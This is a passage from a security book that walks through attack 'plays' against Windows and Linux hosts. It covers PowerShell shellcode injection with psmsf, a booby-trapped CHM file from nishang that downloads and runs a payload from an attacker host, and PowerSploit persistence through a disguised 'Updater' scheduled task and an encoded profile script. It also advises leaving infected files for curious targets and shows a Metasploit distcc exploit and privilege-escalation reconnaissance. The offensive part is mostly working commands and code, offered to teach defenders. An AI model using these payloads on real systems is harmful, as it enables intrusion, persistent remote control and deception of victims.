        # Setting the fifth parameter to 0 declares that the thread should run
        #   immediately after creation.
        # https://msdn.microsoft.com/en-us/library/windows/desktop/ms682453(v=vs.85).aspx
        "$w::CreateThread(0,0,$x,0,0,0);"
        # Start-sleep just provides some time for the shellcode (reverse shell) to execute.
        "for (;;){Start-sleep 60};';"
        # The last single quote above is the end of the string that is assigned to $1.
        # $e is assigned the base 64 encoded string that $1 references.
        "$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));"
        "$2 = \"-enc \";"
    
        # Check if the current process is 64 bit (8 bytes), or something else (32 bit assumed),
        #   then Invoke EXpression (at specific 64 bit path or 32 bit) PowerShell with base64
        #   encoded $e, which references the now base64 encoded string (most of this script).
    
        "if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + \"\syswow64\WindowsPowerShell\\v1.0\powershell\";iex \"& $3 $2 $e\"}else{;iex \"& powershell $2 $e\";}"
        % shellcode
      )
    
      return shellcode

psmsf is [licensed](https://github.com/nixawk/psmsf/blob/master/License.txt) with BSD License.

The `powershell_hacking.bat` file that we copy to our web hosting directory as `payload.txt` is the result of the content referenced above returned to the shellcode variable after it has been `utf_16_le` encoded, then base 64 encoded. This occurs in the [`generate_powershell_command`](https://github.com/nixawk/psmsf/blob/2e599d5a757ea1540794b46a25825e5317b66fc6/psmsf#L108) as follows:

{id="powershell_hacking-bat", linenos=off, lang=python}
    # Gives us powershell_hacking.bat
    shellcode = base64.b64encode(shellcode.encode('utf_16_le'))
    return "powershell -window hidden -enc %s" % shellcode

#### PowerShell Exploitation Evolution {#vps-identify-risks-powershell-exploitation-evolution}

After working with PowerShell exploitation for a few weeks, what quickly becomes apparent is how powerful, easy and effective exploitation and post-exploitation is with the PowerShell medium. There are many tools and modules available to use. Often some will not quite work, then you will find a similar variant that someone has taken and improved that does the job adequately. For example, the attack I just demonstrated was based on Trustedsec's [unicorn.py](https://github.com/trustedsec/unicorn/blob/6f245ebe0c4ab465f15edea12767604120dd0276/unicorn.py#L362-L363), which did not quite work for me. Upstream of unicorn is [Invoke-Shellcode.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1) from the PowerShellMafia PowerSploit project, which is well supported and maintained. Matt Graeber's technique for injecting a given shellcode into the running instance of PowerShell is the common theme running through the PowerShell shellcode injection exploits used in a number of projects. Matt [blog posted](http://www.exploit-monday.com/2011/10/exploiting-powershells-features-not.html) on this technique in 2011 which is very similar to what we just used above with Psmsf. The landscape is very fluid, but there are always options, and they usually don't require any code modifications.

The Veil-Framework's Veil-Evasion has a similar [set of payloads](https://github.com/Veil-Framework/Veil-Evasion/tree/master/modules/payloads/powershell) that @harmj0y [blog posted](https://www.veil-framework.com/powershell-payloads/) on. Kevin Dick also wrote a decent [blog post](http://threat.tevora.com/dissecting-veil-evasion-powershell-payloads-and-converting-to-a-bind-shell/) on these.

**Problems with the other payloads**

When I tested the payload generated by version 7.4.3 of `setoolkit`:  
`1) Social Engineering Attacks` -> `9) Powershell Attack Vectors` ->  `1) Powershell Alphanumeric Shellcode Injector`, it did not work, this [may have been fixed](https://github.com/trustedsec/social-engineer-toolkit/issues/344#issuecomment-269379009) in a later version.

#### PowerShell Exploitation via Office Documents C/- [Nishang](https://github.com/samratashok/nishang) {#vps-identify-risks-powershell-exploitation-via-office-documents-co-nishang}
![](images/ThreatTags/average-common-difficult-severe.png)

Running an executable, or convincing your target to run it works in many cases, but other options such as Office documents can work well also. Nishang is a framework and collection of scripts and payloads that empower us to use PowerShell for all phases of penetration testing. Amongst the many goodies in Nishang is a collection of scripts which can [create Office documents](https://github.com/samratashok/nishang/tree/1b5aca1a1eb170befccf1d111e8902285d553289/Client) such as Word, Excel, CHM and a handful of others.

![](images/HandsOnHack.png)

I> ## Synopsis
I>
I> This play is identical in all areas to the last one, except that we swap the `download-payload-execute.exe` for a chm virus (`doc.chm`) that does the same thing (download and invoke the payload file content). We will use the [`Out-CHM`](https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1) `nishang` script to create the `doc.chm` file that downloads and invokes the same `powershell_hacking.bat` that we hosted as `http://<listener-attack-ip>/payload.txt`. This, as discussed in the [PowerShell Payload creation details](#vps-identify-risks-powershell-exploitation-via-executable-psmsf-powershell-payload-creation-details) above, overwrites the first 0x1000 bytes of the calling instance of PowerShell with the reverse shell that `msvenom` provided to `psmsf`. It then creates a thread in the virtual address space of the calling PowerShell instance and declares that it should be run immediately.
I>
I> The `doc.chm`, or what ever you decide to call it, can be emailed, put on a USB stick, or DVD, and given to your trusting target, or simply leave a few suitably labelled copies lying in a place that will take advantage of our target's curiosity.

I have not provided a video with this play as it is very similar to the previous one.

If you do not already have `nishang` on your Windows attack machine, go ahead and clone it as discussed in the Tooling Setup chapter of Fascicle 0.

{icon=bomb}
G> ## The Play {#powershell-exploitation-via-office-documents}
G>
G> Follow the directions from the [Powershell Exploitation with Psmsf](#powershell-exploitation-with-psmsf-play) play from above, but just swap out the section where we created the C virus and replace with the following:
G>
G> The following PowerShell commands are executed as a low privileged user in ISE from the following foler:  
G> `C:\Source\nishang\Client`  
G> `Import-Module .\Out-CHM.ps1`

{linenos=off, lang=PowerShell}
    # The command to create the CHM:
    Out-CHM -PayloadScript C:\Users\kim\Desktop\persistentFetchRunPayload.ps1 –HHCPath “C:\Program Files (x86)\HTML Help Workshop”
    # persistentFetchRunPayload.ps1 contains the following:
    IEX ((new-object net.webclient).downloadstring('http://<listener-attack-ip>/payload.txt '))

{icon=bomb}
G> This is not persisted, but we use the same file below in [Adding Persistence C/- PowerSploit](#vps-identify-risks-adding-persistence-co-powersploit) where the contents is persisted.
G>
G> You should see a `doc.chm` created in the folder that you ran the above command from.
G>
G> Next, you need to get the `doc.chm` onto your target's machine, or a network share that your target can access/copy from, and persuade your target to run the `doc.chm`. When they do, the results will be the same as we saw in the [Powershell Exploitation with Psmsf](#powershell-exploitation-with-psmsf-play) play from above from where the target runs the virus.

#### Adding Persistence C/- Meterpreter {#vps-identify-risks-adding-persistence-co-meterpreter}

Metasploit had a Meterpreter script called [`persistence.rb`](https://www.offensive-security.com/metasploit-unleashed/meterpreter-service/) that could create a persistent (survive reboots, and most other actions a user will take) reverse shell, but these scripts are no longer supported. If you try to use it, you will probably receive an error such as: "`windows version of Meterpreter is not supported with this Script`"

At present, the [`exploit/windows/local/persistence`](https://github.com/rapid7/metasploit-framework/issues/6904) module is recommended for persistence. AV picks this up on reboot though, so you probably will not get very far with this persistence mechanism. 

#### Adding Persistence C/- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/) {#vps-identify-risks-adding-persistence-co-powersploit}

We can do better than `meterpreter`. PowerSploit has a module called [Persistence](https://github.com/PowerShellMafia/PowerSploit/blob/master/Persistence/Persistence.psm1), which we'll use in this play. This adds persistence to the PowerShell one-liner that was embedded in the `psmsf` virus we created above, namely [`download-payload-execute`](#download-psmsf-payload-execute), and also used in the Office document [attack with `nishang`](#powershell-exploitation-via-office-documents). The one-liner was:

{title="persistentFetchRunPayload.ps1", linenos=off, id="persistentFetchRunPayload-ps1", lang=PowerShell}
    IEX ((new-object net.webclient).downloadstring('http://<listener-attack-ip>/payload.txt '))

I had a play with the `nishang` [`Add-Persistence.ps1`](https://github.com/samratashok/nishang/blob/1b5aca1a1eb170befccf1d111e8902285d553289/Utility/Add-Persistence.ps1) script, which may be useful for creating post-exploitation persistence, but I was looking for a solution to create an atomic persistent exploit, which is provided by PowerSploit.

![](images/HandsOnHack.png)

I> ## Synopsis
I>
I> In this play we extend the [PowerShell Exploitation via Office Documents](#powershell-exploitation-via-office-documents) play with help from PowerSploit.

![](images/PersistentPowerShell.png)

&nbsp;

You can find the video of how this attack is played out at [https://youtu.be/al9RX40QuXU](https://youtu.be/al9RX40QuXU).

If you do not already have `PowerSploit` on your Windows attack machine, go ahead and clone it as discussed in the Tooling Setup chapter of Fascicle 0.

{icon=bomb}
G> ## The Play
G>
G> All following PowerShell commands are executed as a low privileged user in ISE:
G>
G> `PS C:\Source\PowerSploit\Persistence> Import-Module .\Persistence`
G>
G> The next command imports the `ScriptModification` module for the command we use below where we need `Out-EncodedCommand`:  
G> `PS C:\Source\PowerSploit\Persistence> Import-Module ..\ScriptModification`
G>
G> In case target runs virus with elevated privileges, you need to run:  
G> `PS C:\Source\PowerSploit\Persistence>$ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -Hourly`  
G> In case target runs virus with standard privileges, you need to run:  
G> `PS C:\Source\PowerSploit\Persistence>$UserOptions = New-UserPersistenceOption -ScheduledTask -Hourly`
G>
G> This next command creates the script ([`Persistence.ps1`](#Persistence-ps1)), and its encoded form ([`EncodedPersistentScript.ps1`](#EncodedPersistentScript-ps1)) that, when downloaded from the attacker's hosting location and invoked atomically by the `doc.chm` created by `nishang` below, persists the contents of [`persistentFetchRunPayload.ps1`](#persistentFetchRunPayload-ps1) in its encoded form into the target's PowerShell profile. If the target is running as administrator when they open `doc.chm`, the contents of the `persistentFetchRunPayload.ps1` in its encoded form will be written to `%windir%\system32\Windows­PowerShell\v1.0\profile.ps1`, and an hourly scheduled task set to run `PowerShell.exe` as `System` will be created. If the target is running as a low privileged user when they open `doc.chm`, the contents of the `persistentFetchRunPayload.ps1` in its encoded form will be written to `%UserProfile%\Documents\Windows­PowerShell\profile.ps1`, and an hourly scheduled task will be set to run `PowerShell.exe` as the user. When `PowerShell.exe` runs, it implicitly runs what ever is in your `profile.ps1`  
G> `PS C:\Source\PowerSploit\Persistence>Add-Persistence -FilePath C:\Users\kim\Desktop\persistentFetchRunPayload.ps1 -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -Verbose -PassThru | Out-EncodedCommand | Out-File .\EncodedPersistentScript.ps1`
G>
G> Just as in the [PowerShell Exploitation via Office Documents](#vps-identify-risks-powershell-exploitation-via-office-documents-co-nishang) above, the `persistentFetchRunPayload.ps1` is used.  
G> This same script was used/embedded in the "PowerShell Exploitation with Psmsf" C virus [`download-payload-execute`](#download-psmsf-payload-execute) we created above.
G>
G> `Persistence.ps1` looks like the following:

{id="Persistence-ps1", title="Persistence.ps1", linenos=off, lang=PowerShell}
    function Update-Windows{
    Param([Switch]$Persist)
    $ErrorActionPreference='SilentlyContinue'
    # The encoded string is the contents of persistentFetchRunPayload.ps1 encoded.
    $Script={sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('7b0HYBxJliUmL23Ke39K9UrX4HShCIBgEyTYkEAQ7MGIzeaS7B1pRyMpqyqBymVWZV1mFkDM7Z28995777333nvvvfe6O51OJ/ff/z9cZmQBbPbOStrJniGAqsgfP358Hz8izk5/73Rra5lfbVeTn86nbbrM2/FVPpmWRb5s74xn1dWyrLJZ09bF8mLr43nbrh7dvbv7cG+8++nBeGe8u3d3lV2jybh916Yf37nz/wA='),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()}
    if($Persist){
    if(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator'))
    {$Prof=$PROFILE.AllUsersAllHosts;$Payload="schtasks /Create /RU system /SC HOURLY /TN Updater /TR `"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive`""}
    else
    {$Prof=$PROFILE.CurrentUserAllHosts;$Payload="schtasks /Create /SC HOURLY /TN Updater /TR `"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive`""}
    mkdir (Split-Path -Parent $Prof)
    (gc $Prof) + (' ' * 600 + $Script)|Out-File $Prof -Fo
    iex $Payload|Out-Null
    Write-Output $Payload}
    else
    {$Script.Invoke()}
    } Update-Windows -Persist

{icon=bomb}
G> The encoded form of the above script `Persistence.ps1` is `EncodedPersistentScript.ps1` and looks like the following:

{id="EncodedPersistentScript-ps1", title="EncodedPersistentScript.ps1", linenos=off, lang=PowerShell}
    powershell  -E "cwBhAGwAIABhACAATgBlAHcALQBPAGIAagBlAGMAdAA7AGkAZQB4ACgAYQAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgAKABhACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARABlAGYAbABhAHQAZQBTAHQAcgBlAGEAbQAoAFsASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AXQBbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcANwBiADAASABZAEIAeABKAGwAaQBVAG0ATAAyADMASwBlADMAOQBLADkAVQByAFgANABIAFMAaABDAEkAQgBnAEUAeQBUAFkAawBFAEEAUQA3AE0ARwBJAHoAZQBhAFMANwBCADEAcABSAHkATQBwAHEAeQBxAEIAeQBtAFYAVwBaAFYAMQBtAEYAawBEAE0ANwBaADIAOAA5ADkANQA3ADcANwAzADMAMwBuAHYAdgB2AGYAZQA2AE8ANQAxAE8ASgAvAGYAZgAvAHoAOQBjAFoAbQBRAEIAYgBQAGIATwBTAHQAcgBKAG4AaQBHAEEAcQBzAGcAZgBQADMANQA4AEgAegA4AGkAZgB1AFAAawBmAEwAMgBjAHQAawBXADEAVABMADkAYQB6AGIASQAyADMALwA1AHUAcwBaAHgAVgBWADgAMAB2AC8AbwAyAFQAbAAxAG0AZABMAGIAYQArADkALwBxAHEAYQBLAGYAegA3AC8AOQB1AEwALwBPADYASwBaAHIAMgB6AG0AKwBjAC8ARwA2AG4AZABWADMAVgB4AC8AegBhAHkAegBvAC8AegArAHQAOABPAGMAMAAvACsALwBoADEAVQBlAGIATAB0AHIAdwArAHEAWgBaAHQAcwBWAHoAbgBIADEAUABUADEAOQBPADYAVwBMAFcAZgAvAGUASQBtAEsAOQBNAHMAZgBaAEYAZgBiAFgAOAA1ACsAZQBsADgAMgBoADQAVwArAGIAdQB0AEwARAAzADcAYwB2AHkANgByAGYATgBzADgAUwByAFAAWgBuAG0AOQBKAFIAKwBkAFYASQB0AFYAbgBUAGMATgB3AFIAOAAvAHoAYwA5AEwAdwBrAHQAYQBiAFgAMgBQAHYAdgAwAGkAWAAxAFQAMQB0AFgAegB3AC8AZQA5AFIAWgA1AGQANQAzAFgANwAvADAAYQBOAG4AZABiAFYANABrAGoAWAA1AHAALwB2ADAAWABiAEcAOAAyAFAAcgA0AHcAVwBUAG4AMgA3AC8AUABrADMAZgBmAEsAWQB1AHYARgBzAC8AMwA3AHYAMQBlACsAYgAyAEgAdgA5AGYARAByACsAcgBmAGUALwAvAGIAcgArAGMAbgBaADAAOAB1AFQAcQAvAGYALwBEADUAdgBUADQAOQAvADQAcwBFAFgAbgA1AC8AOQBJAE0AOQBlAFAAMwBpAHkAdQAzAHAAMQAvAGMAWABxAEYAMQAzAC8AbwBpAGYAWABpADUALwA4ADcAawAvADkANQBPADcAaQAyAGQAdQBuAFgAegB6ADQAcQBiADIARABoAHcALwB2AFAAMwBqAHcANABOADYAOQBlADgAdgBMAHkAOAB2AHoALwBOAE0AdgA3ACsAOQArACsAWgAyADcANQArAGQAMwBmAC8AQgB3ACsAbABPAEwAbgAzAGcAeQBlAFQAbgA1AGsAdgByADkAegByAEwANAAvAFAAZwBYAE4AUgBmAG4ATAArAC8AZABQAC8AagAyAEQAdwA2AEsASAA3AHkAOQBmAC8AZgBCAHYAVgBkADEAZAByADgAOABuAC8AeABrAC8AbQBaADUAOABPAGwAeQBNAHEAbQAvADIATAB2ADcANwBDAGQAZgByAGgAYgBmAGYAVABXADUAMwB6AHoAWQBmADcAZgBjAG4AWAAzADMAdQBuADcAKwBuAFoALwBhAGUAVABoADUAZAByAEIANABYAHUALwBmAFcAMAA3AHEAKwBZAFAAWgA1AGUAVAB5AHcAZgBUAHoAVAB3ADQAKwArAFcAVAA1AEoAUAA4ADgAUAAxAGoAZgBtADkAMAByAGYAMwBMAHYAcAA2ADgAbgA4ADQAZQA3AG4ALwA0ACsANQAvAGMAZQBMAEgAOQB3ADkAKwByADQAcwA0AC8AdgBqAEwANwBYAEkAWgAzADMAKwB4AGYAVgBMAEMAYwBTAFAAYwAyAG4AKwB0AGsAZABhAHYANABtAGYAOQBlAE8AVAA1AGYAVABhAGsAYgBVAG8AbQArAFAAWAA1ACsAYwBuAGQAMgA1AE0AOABaAGMAdgBLAGwATwBsADcATwB0AE8ANwAvAGsATgAwADYASwA4AHkAMAA3ADkANwArAFkALwB5AFMAZQB5AEsAZgByAHUAbQBpAHYAeAB5ACsASgAwAE4ATgBpAGwAWgBWAGoANQBSAHYANwB3AGYAYwAzAE4ARABxAGIARQBaAC8AUQBOADkAVABuADUAMwBsADcAcwBxADYASgBnAGQAbwB0ADYAdgBtAHMATwBWAHUAKwBxAHMAcAA4AFUAdwA5AFAAMQBrAFgAWgBTAHIAUAB2AGYAMwB3ADgAVwB4AFIATAB3AHEAegBPADIAcQByACsAKwBBADQAeAA1AHkALwArADMAVgA3AFcAMQBmAGwAbgB2ADkAdgBMAFYAMQA4ACsATwAzAHQAKwBPAGoANAB1AHkANgA4AGEAUQBwADkAKwBmAHIAdABxADIAdQBiAHcAZAAzAHUAWgBYAFoAZABWAE4AdgB2AHMAbwAyAFkANgBiADcAUABtAGIAWgBQAGUAUABTAEYAZQBhAHYAUAAwADcAcQB1AHYAMAB1AGEANgBhAGYATgBGAGUAdgBmADEAUwBmAHIAdABMADcAOQA2ADkAZgB6ADMAUwBlACsAKwBlAGEASABDAFUAZABQAHYAcgA5AEkALwA0AEsAUABmAGIAZQB0ADMATwAxADEAZQBQAG4AcgBOAFQAVgA5AFYAVgBYAHYAbgA5ADUAWABmADcAKwAzADkAdgBvAFkATwAxAFYAVgBlAHYANQA3AG4AWgBmAG4ANwBYAHUANgBPAGQAMwA3AGYARgBmADUAdQA4AFAAYwA0AGYANQBlAG4AMgB5ACsAcQA1AGQAbQBTAEkARwBZAGsAUgBaAGYANQBIAC8ARABSAFIAMABUAHAAdgBHAHoAeQAvAGcAQwBVAFAAQgBqAEUAcgBjAGIAdwBjADQARAA0ADQAdQAyAHMAcQBOAE8AdAAxADYAdQB5AGEATABkAGYAWgB1ADAAOABwAFgAKwBCAGQATQBwAGoAbwBWAG4AWgB1AHAAagBxADcAKwBrAG4ANgBkAGIASAA2AGMAZgBwAHQAOQBKAFAAZAAzAGIAbwBEADkAVQBRAGQAMwA3AG0AeQAzAFcANwAvAFkAdwAwAGkATABSAEwAdAA1ADkAVgB4AEcAegA1AHUAOQBTAE0AbABSAHUAOABXAEoAZgBsAGIANQB4ADgAbAB6AGcAagAzADYAYQAvAFYAKwB2AFcAZgB1ADgAUgBVAEUAQwBPAHoANQBhAFgAMQBkAHUAYwBtAGYAaQBYAGQATgBRAGIASQBTAGcAcwAvAFIAcwBuAHYAMwBIAHkALwB3AEEAPQAnACkALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACwAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkA"

{icon=bomb}
G> `EncodedPersistentScript.ps1` now needs to be hosted somewhere. As in the above plays, we will host it on our Kali Linux VM (in `/var/www/html/`), that we have already used, and will be continuing to:  
G> 1. Listen for the reverse shell  
G> 2. Host `powershell_hacking.bat` as `/var/www/html/payload.txt`  
G> As in the previous plays, Start your web server if it is not still running:  
G> `Service apache2 start`  
G> I tried downloading and `I`nvoking `EX`pression from ISE using both of the following two commands:

{linenos=off, lang=PowerShell}
    IEX ((new-object net.webclient).downloadstring('http://<listener-attack-ip>/Persistence.ps1 '))
    # and:  
    IEX ((new-object net.webclient).downloadstring('http://<listener-attack-ip>/EncodedPersistentScript.ps1 '))

{icon=bomb}
G> before doing the same thing when running the `doc.chm` that we create below. Both `Persistence.ps1` and `EncodedPersistentScript.ps1` gave me problems initially. It turned out that the actual file encoding of both files was not right. If you just copy either of the files from your Windows attack VM to your hosting directory on your Kali Linux VM, you may have the same issue. I ended up creating a new file in the hosting location and copy->pasting the file contents into the new file, which worked successfully. The first part of the error from `IEX` in ISE for `Persistence.ps1` was:
G>
G> `The term 'ÿþf u n c t i o n ' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again. At line:1 char:19`
G>
G> For `EncodedPersistentScript.ps1` it was:
G>
G> `The term 'ÿþp o w e r s h e l l ' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again. At line:1 char:23`
G>
G> See the funny characters? That is what gave it away.
G>
G> We now create `doc.chm`, or what ever you want to call it, informing `Out-CHM` that we want the payload of `doc.chm` to be the script ([`EncodedPersistentScript.ps1`](#EncodedPersistentScript-ps1)) we just created and hosted. When downloaded and invoked, it will persist the contents of [`persistentFetchRunPayload.ps1`](#persistentFetchRunPayload-ps1) in its encoded form to the PowerShell profile that belongs to the user who opened `doc.chm`. Run the following commands to create `doc.chm`:  
G> `PS C:\Source\nishang\Client> Import-Module .\Out-CHM.ps1`  
G> `PS C:\Source\nishang\Client>Out-CHM -PayloadURL http://<listener-attack-ip>/EncodedPersistentScript.ps1 –HHCPath “C:\Program Files (x86)\HTML Help Workshop”`
G>
G> Next, we setup our Metasploit listener, ready to catch the reverse shell when our target runs `doc.chm`. We use the same `powershell_msf.rc` resource file that `psmsf` created for us in the [PowerShell Exploitation with Psmsf](#powershell-exploitation-with-psmsf-play) play above.  
G> Start your listener using the `powershell_msf.rc` resource rile:  
G> `msfconsole -r powershell_msf.rc`

{icon=bomb}
G> The `doc.chm` file must be delivered to your target's machine or a network share that your target can access/copy from, and your target must be persuaded to run it. When they do, as discussed above, `EncodedPersistentScript.ps1` will be downloaded and invoked, which will write the embedded encoded contents of `persistentFetchRunPayload.ps1` to the PowerShell profile, and setup a scheduled task. When the task fires, as in the previous attacks, the `payload.txt` will be downloaded, and its expression invoked, which causes the reverse shell to be executed. The Metasploit listener will catch the shell. If you have the scheduled task configured to run every hour, then you will get a reverse shell every hour. This survives reboots and most other actions any user will take, other than removing the PowerShell profile contents we created, or removing the scheduled task.

The PowerSploit Persistence module offers the following persistence techniques:

* PermanentWMI
* ScheduledTask (as we have just seen)
* Registry

At the following stages:

* `AtLogon`
* `AtStartup`
* `OnIdle`
* `Daily`
* `Hourly` (as we have just seen)
* `At` (specify specific times)

I> Be aware if you want to use the `OnIdle` parameter, that the Windows Task Scheduler service only checks every 15 minutes to see if the computer is in an idle state. The computer is considered to be [idle if](https://social.technet.microsoft.com/Forums/windows/en-US/692783e7-bb73-45d1-95d6-8f2d1363d6c7/cant-get-task-schedular-to-run-a-batch-on-idle?forum=w7itprogeneral):
I>
I> 1) A screen saver is running, or  
I> 2) no screen saver is running, the CPU is at 0% usage, and there is 0% disk I/O for 90% of the past fifteen minutes, and if there has been no keyboard or mouse input for that period of time.

T> The easiest way to kill many instances of `powershell` when you are experimenting is to run the following command:  
T> `taskkill /F /IM powershell.exe /T`

There are many ways to achieve persistence. I have not included any lateral movement or privilege escalation amongst these PowerShell plays, but feel free to take your post-exploitation further. The tools we have used in these plays include a good variety of both lateral movement and privilege escalation options.

### Unnecessary and Vulnerable Services 

#### Overly Permissive File Permissions, Ownership and Lack of Segmentation {#vps-identify-risks-unnecessary-and-vulnerable-services-overly-permissive-file-permissions-ownership-and-lack-of-segmentation}
![](images/ThreatTags/average-common-difficult-moderate.png)

Failure to segment a file system or services, according to least privilege principles, is often the precursor to **privilege escalation**. The definition of least privilege in this case being: What is the least amount of privilege any authorised parties require in order to do their job successfully?

Privileged services that are started on system boot by your init system (as discussed under the [Proactive Monitoring](#vps-countermeasures-lack-of-visibility-proactive-monitoring-sysvinit-upstart-systemd-runit) section) often run other executable files, whether they be binaries or scripts.

When an executable (usually run as a daemon) is called by one of these privileged services, and is itself writeable by a low privileged user, then a malicious actor can swap the legitimate executable for a trojanised replica, or even just a malicious executable they think will go unnoticed.

It doesn't pay to take the path of least resistance when setting up our VPS partitions during installation. Combining file system resources with lesser requirements for higher privileges, with those that have greater requirements, contradicts the principle of least privilege. Simply, some resources that don't need extra privileges to do their job, are granted them regardless. This allows attackers to exploit the opportunity, by swapping in (writing) and executing malicious files, directly or indirectly.

If a target file of interest to an attacker is world writeable, user writeable, or even group writeable, then the attacker will be able to swap or trojanize the file. Only if the mounted file system is restrictive will the action be mitigated.

{#vps-identify-risks-unnecessary-and--vulnerable-services-overly-permissive-file-permissions-ownership-and-lack-of-segmentation-mitigations}
1. The first risk is at the file permission and ownership level
    1. The first tool to pull out of the bag is [unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check), which is source hosted on [GitHub](https://github.com/pentestmonkey/unix-privesc-check) and is shipped with Kali Linux, but only Kali 1.x (`unix-privesc-check` single file). The later version which resides on the master branch (`upc.sh` main file plus many sub files) does a lot more, so consider using both. You just need to pull the shell file(s) from either the `1_x` or `master` branch to your target system and run. Run it as root to allow the testing to be a lot more thorough, for obvious reasons. If I'm testing my own host, I will start with `upc.sh`. I like to test as a non root user first, as that is the most realistic in terms of how an attacker would use it. Simply reading the main file will give you a good idea of the options, or you can just run:  
    `./upc.sh -h`  
        
        
        To run:  
        `# Produces a reasonably nice output`  
        `./upc.sh > upc.output`  
        
        
    2. [LinEnum](https://github.com/rebootuser/LinEnum) is also very good at host reconnaissance, providing a lot of potentially good information on files that can be trojanised.  
    Also check the [Additional Resources](#additional-resources-vps-identify-risks-unnecessary-and-vulnerable-services-overly-permissive-file-permissions-ownership-and-lack-of-segmentation) chapter for other similar tools for both Linux and Windows.
2. The second risk is at the mount point of the file system. This is quite easy to test and it also takes precedence over file permissions, as the mount options apply to the entire mounted file system. This is why applying the most restrictive permissions to granular file system partitioning is so effective.
    1. The first and easiest command to run is:  
    `mount`  
    This will show you the options that all of your file systems were mounted with. In Countermeasures we address how to improve the permissiveness of these mounted file systems.
    2. For peace of mind, I usually like to ensure that the options that our file systems appear to be mounted with, are the actual permissions. You can make sure by trying to write an executable file to the file systems that have `noexec` as specified in `/etc/fstab`. When you attempt to run it, it should fail.
    3. You can try writing any file to the file systems that have the `ro` (read-only) option specified against them in the `/etc/fstab`, that should also fail.
    4. Applying the `nosuid` option to your mounts prevents the `suid` (**S**et owner **U**ser **ID**) bit on executables from being honoured. As an example, an executable may have its `suid` bit set, but any other logged in user temporarily inherits the file owner's permissions, as well as the UID and GID to run that file, rather than their own permissions.

Running a directory listing that has a file with its `suid` bit set will produce a permission string similar to `-rwsr--r--`  
The `s` is in the place of the owners executable bit. If instead a capitol `S` is used, it means that the file is not executable

All `suid` files can be found with the following command:  
`find / -perm -4000 -type f 2>/dev/null`

All `suid` files owned by root can be found with the following command:  
`find / -uid 0 -perm -4000 -type f 2>/dev/null`

To add the `suid` bit, you can do so symbolically or numerically.

symbolic:  
`chmod u+s <yourfile>`

numeric:  
`chmod 4750 <yourfile>`

This adds the `suid` bit, read, write and execute for `owner`, read and execute for `group` and no permissions for `other`. This is just to give you an idea of the relevance of the `4` in the above `-4000`, do not set the `suid` bits on files unless you fully understand what you are doing, and have good reason to do so. Doing so could introduce a security flaw, and if the file is owned by root, you may have just added a perfect vulnerability for an attacker to elevate their privileges to root due to a defect in your executable, or the fact that the file can be modified/replaced.

For example, if root owns a file and the file has its `suid` bit set, anyone can run that file as root.

![](images/HandsOnHack.png)

We will now walk through the attacker's steps to carry out a privilege escalation.

You can find the video of how this is played out at [https://youtu.be/ORey5Zmnmxo](https://youtu.be/ORey5Zmnmxo).

I> ## Synopsis
I>
I> First we carry out some reconnaissance on our target machine. I am using Metasploitable2 for this play.  
I> Then find a suitable open port with a defective service listening, this is the Vulnerability Scanning / Discovery stage.  
I> Then we search for an exploit that may be effective at giving us at least low privilege access to the machine.  
I> Then use the tools I have just discussed above to help us find possible writeable, executable directories and/or files.  
I> Then we can search for exploits that may help us escalate our privileges, based on a part of the file system that we now know we have write and execute permissions on.  
I> We then walk through understanding a chosen exploit and preparing it to be run.

{icon=bomb}
G> ## The Play
G>
G> A simple nmap scan will show us any open ports.  
G> One of the ports is 3632, with the `distcc` (distributed compiler, useful for speeding up source code compilation) daemon listening.  
G>
G> Let's check to see if Metasploit is aware of any `distcc` exploits.
G>
G> 
G> `msfconsole`  
G> `msf > db_rebuild_cache`  
G> `msf > search distcc`  
G> `msf > use exploit/unix/misc/distcc_exec`  
G> `msf exploit(distcc_exec) > set RHOST metasploitable`  
G> `msf exploit(distcc_exec) > exploit`  
G> In the video, metasploitable was running at 192.168.56.21. Afterwards, I had to change the virtual adapter, so that it could also connect to the outside world to fetch my payload. It ended up running on 192.168.0.232. My attacking machine also changed from 192.168.56.20 to 192.168.0.12
G>
G> Now we have a shell, let's test it.
G>
G> `pwd`  
G> `/tmp`  
G> `whoami`  
G> `daemon`  
G>
G> All the following commands can be run through our low privilege user.
G>
G> Running `unix-privesc-check` and directing the output to a file shows us:  
G> `I: [group_writable] /tmp is owned by user root (group root) and is group-writable (drwxrwxrwt)`
G>
G> What about a file system that is mounted with permissions that will allow us to write a file that may be executed by one of the previously mentioned privileged services?  
G>
G> `mount`  
G> Shows us that we have very little in the way of granular partitioning and we have `/` mounted as `rw`, so as a low privileged user, we can both write and execute files in `/tmp` for example.  
G>
G> We could also just search for "Privilege Escalation" exploits targeting our target's kernel.  
G> Echo the target's kernel version: `uname -a` produces:  
G> `2.6.24`
G>
